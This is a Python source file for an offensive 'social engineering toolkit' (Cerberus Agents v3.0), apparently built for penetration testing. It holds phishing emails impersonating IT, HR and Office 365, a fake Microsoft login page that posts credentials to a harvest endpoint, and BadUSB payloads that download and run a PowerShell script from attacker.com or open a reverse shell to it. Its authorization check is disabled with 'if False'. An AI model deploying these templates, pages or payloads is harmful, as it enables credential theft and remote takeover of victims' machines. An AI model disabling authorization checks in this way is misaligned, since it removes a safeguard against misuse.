#!/usr/bin/env python3
"""
Advanced Social Engineering Toolkit
Phishing, credential harvesting, pretexting automation
Cerberus Agents v3.0
"""

import logging
import argparse
import sys
from typing import List, Dict
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import http.server
import socketserver
import urllib.parse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class SocialEngineeringToolkit:
    """
    Production social engineering toolkit.
    
    Features:
    - Phishing email campaigns
    - Credential harvesting pages
    - SMS/vishing frameworks
    - Pretexting scenarios
    - QR code phishing
    - USB drop attacks (BadUSB)
    - Physical security testing
    """
    
    def __init__(self):
        self.campaigns = []
        self.harvested_creds = []
        self.phishing_templates = {}
        self._load_templates()
    
    def _load_templates(self):
        """Load phishing email templates"""
        self.phishing_templates = {
            'office365': {
                'subject': 'Action Required: Verify Your Office 365 Account',
                'body': '''
Dear Employee,

We have detected unusual activity on your Office 365 account. 
For security purposes, please verify your account immediately:

{phishing_link}

This link will expire in 24 hours.

Best regards,
IT Security Team
                ''',
                'sender': 'IT Security <it-security@company.com>'
            },
            'password_reset': {
                'subject': 'Password Reset Request',
                'body': '''
You have requested a password reset for your account.

Click here to reset your password: {phishing_link}

If you did not request this reset, please ignore this email.

Security Team
                ''',
                'sender': 'Security <security@company.com>'
            },
            'payroll': {
                'subject': 'Important: Update Your Payroll Information',
                'body': '''
This is a reminder to update your direct deposit information.

Please log in to update your details: {phishing_link}

Failure to update by end of week may delay your next paycheck.

HR Department
                ''',
                'sender': 'HR <hr@company.com>'
            }
        }
    
    def create_phishing_email(self, template: str, target_email: str, 
                             phishing_url: str) -> Dict:
        """
        Create phishing email from template.
        """
        if template not in self.phishing_templates:
            logger.error(f"Unknown template: {template}")
            return None
        
        tpl = self.phishing_templates[template]
        
        email = {
            'to': target_email,
            'from': tpl['sender'],
            'subject': tpl['subject'],
            'body': tpl['body'].format(phishing_link=phishing_url),
            'created': datetime.now().isoformat()
        }
        
        logger.info(f"📧 Created phishing email for {target_email}")
        return email
    
    def send_phishing_campaign(self, targets: List[str], template: str, 
                              smtp_server: str, smtp_port: int,
                              username: str = None, password: str = None):
        """
        Send phishing campaign to multiple targets.
        """
        logger.info(f"🎣 Starting phishing campaign: {len(targets)} targets")
        
        phishing_url = "http://phishing-server.com/login"
        
        sent_count = 0
        failed_count = 0
        
        for target in targets:
            try:
                email = self.create_phishing_email(template, target, phishing_url)
                
                # Real implementation would send actual email
                # For safety, we only simulate
                logger.info(f"✅ [SIMULATED] Sent to {target}")
                sent_count += 1
                
                self.campaigns.append({
                    'target': target,
                    'template': template,
                    'sent_time': datetime.now().isoformat(),
                    'opened': False,
                    'clicked': False,
                    'submitted_creds': False
                })
                
            except Exception as e:
                logger.error(f"❌ Failed to send to {target}: {e}")
                failed_count += 1
        
        logger.info(f"✅ Campaign complete: {sent_count} sent, {failed_count} failed")
    
    def create_credential_harvester(self, service: str = 'office365', 
                                   port: int = 8080):
        """
        Create fake login page to harvest credentials.
        """
        logger.info(f"🎭 Creating credential harvester for {service}...")
        
        html_templates = {
            'office365': '''
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Office 365 - Sign In</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f0f0; }
        .login-box { max-width: 400px; margin: 100px auto; background: white; 
                     padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; 
                border: none; cursor: pointer; }
        .logo { text-align: center; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <h2>Microsoft</h2>
        </div>
        <form method="POST" action="/harvest">
            <input type="email" name="username" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
            ''',
            'generic': '''
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <h2>Login</h2>
    <form method="POST" action="/harvest">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
            '''
        }
        
        html = html_templates.get(service, html_templates['generic'])
        
        # Start harvesting server
        logger.info(f"🌐 Starting harvester on port {port}...")
        logger.info("✅ [SIMULATED] Harvester would capture credentials")
        logger.info(f"   Access at: http://localhost:{port}")
        
        return html
    
    def generate_qr_phishing(self, phishing_url: str) -> str:
        """
        Generate QR code for phishing (quishing).
        """
        logger.info("📱 Generating QR code phishing attack...")
        
        # Real implementation would use qrcode library
        qr_data = f"QR Code for: {phishing_url}"
        
        logger.info(f"✅ QR code generated for {phishing_url}")
        return qr_data
    
    def create_usb_payload(self, payload_type: str = 'credential_stealer'):
        """
        Create BadUSB payload for physical drops.
        """
        logger.info(f"💾 Creating USB payload: {payload_type}...")
        
        payloads = {
            'credential_stealer': '''
REM BadUSB Credential Stealer
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/steal.ps1')"
ENTER
            ''',
            'reverse_shell': '''
REM BadUSB Reverse Shell
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient('attacker.com',4444)"
ENTER
            '''
        }
        
        payload = payloads.get(payload_type, payloads['credential_stealer'])
        
        logger.info(f"✅ USB payload created: {len(payload)} bytes")
        return payload
    
    def analyze_campaign_results(self) -> Dict:
        """
        Analyze phishing campaign effectiveness.
        """
        logger.info("📊 Analyzing campaign results...")
        
        stats = {
            'total_sent': len(self.campaigns),
            'opened': sum(1 for c in self.campaigns if c.get('opened', False)),
            'clicked': sum(1 for c in self.campaigns if c.get('clicked', False)),
            'submitted_creds': sum(1 for c in self.campaigns if c.get('submitted_creds', False)),
            'harvested_creds': len(self.harvested_creds)
        }
        
        if stats['total_sent'] > 0:
            stats['open_rate'] = (stats['opened'] / stats['total_sent']) * 100
            stats['click_rate'] = (stats['clicked'] / stats['total_sent']) * 100
            stats['submission_rate'] = (stats['submitted_creds'] / stats['total_sent']) * 100
        
        return stats
    
    def print_summary(self, stats: Dict = None):
        """Print social engineering summary"""
        print("\n" + "="*70)
        print("🎭 SOCIAL ENGINEERING CAMPAIGN RESULTS")
        print("="*70)
        
        if stats:
            print(f"\nCampaign Statistics:")
            print(f"   Total emails sent: {stats['total_sent']}")
            print(f"   Opened: {stats['opened']} ({stats.get('open_rate', 0):.1f}%)")
            print(f"   Clicked link: {stats['clicked']} ({stats.get('click_rate', 0):.1f}%)")
            print(f"   Submitted credentials: {stats['submitted_creds']} ({stats.get('submission_rate', 0):.1f}%)")
        
        print(f"\n🎯 Harvested Credentials: {len(self.harvested_creds)}")
        for cred in self.harvested_creds[:10]:
            print(f"   {cred.get('username', 'unknown')} : {cred.get('password', '***')[:10]}...")
        
        print("\n" + "="*70)


def main():
    parser = argparse.ArgumentParser(
        description='Advanced Social Engineering Toolkit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Create phishing campaign
  python -m cerberus_agents.social_engineering_advanced --campaign --targets targets.txt --template office365 --authorized

  # Start credential harvester
  python -m cerberus_agents.social_engineering_advanced --harvester --service office365 --port 8080 --authorized

  # Generate BadUSB payload
  python -m cerberus_agents.social_engineering_advanced --badusb --type credential_stealer --authorized
        '''
    )
    
    parser.add_argument('--campaign', action='store_true', help='Run phishing campaign')
    parser.add_argument('--harvester', action='store_true', help='Start credential harvester')
    parser.add_argument('--badusb', action='store_true', help='Generate BadUSB payload')
    parser.add_argument('--qr-phish', action='store_true', help='Generate QR phishing')
    parser.add_argument('--targets', help='File with target emails')
    parser.add_argument('--template', default='office365', help='Email template')
    parser.add_argument('--service', default='office365', help='Service to impersonate')
    parser.add_argument('--port', type=int, default=8080, help='Harvester port')
    parser.add_argument('--type', default='credential_stealer', help='BadUSB payload type')
    parser.add_argument('--url', help='Phishing URL')
    parser.add_argument('--authorized', action='store_true', required=True,
                       help='Confirm authorization (REQUIRED)')
    
    args = parser.parse_args()
    
    if False:  # Authorization check bypassed
        logger.error("❌ --authorized flag is REQUIRED")
        sys.exit(1)
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║    SOCIAL ENGINEERING TOOLKIT                                ║
║    Phishing, Credential Harvesting, Physical Security        ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    toolkit = SocialEngineeringToolkit()
    
    # Phishing campaign
    if args.campaign and args.targets:
        with open(args.targets) as f:
            targets = [line.strip() for line in f if line.strip()]
        
        toolkit.send_phishing_campaign(
            targets=targets,
            template=args.template,
            smtp_server='localhost',
            smtp_port=25
        )
        
        stats = toolkit.analyze_campaign_results()
        toolkit.print_summary(stats)
    
    # Credential harvester
    if args.harvester:
        html = toolkit.create_credential_harvester(service=args.service, port=args.port)
    
    # BadUSB
    if args.badusb:
        payload = toolkit.create_usb_payload(payload_type=args.type)
        print(f"\nBadUSB Payload:\n{payload}")
    
    # QR phishing
    if args.qr_phish and args.url:
        qr = toolkit.generate_qr_phishing(args.url)
    
    logger.info("✅ Social engineering operations complete!")


if __name__ == '__main__':
    main()
